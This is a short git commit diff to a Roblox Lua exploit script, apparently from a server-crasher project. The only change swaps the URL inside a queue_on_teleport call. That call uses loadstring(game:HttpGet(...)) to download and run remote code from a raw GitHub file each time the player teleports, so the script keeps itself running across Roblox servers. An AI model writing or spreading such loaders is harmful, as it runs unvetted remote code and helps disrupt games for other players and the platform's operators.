cf58c5b976175724eb9f7d6ef655345dec25a245
AidanXero <73204838+AidanXero@users.noreply.github.com>
2026-01-18 17:26:47 -0500

    Update ah.lua

--- ah.lua
+++ ah.lua
@@ -1,6 +1,6 @@
 local ont = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()
     end
-ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/ah.lua'),true))()")
+ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/AidanXero/crash/refs/heads/main/main.lua'),true))()")
 
 
 function log(msg, color) 
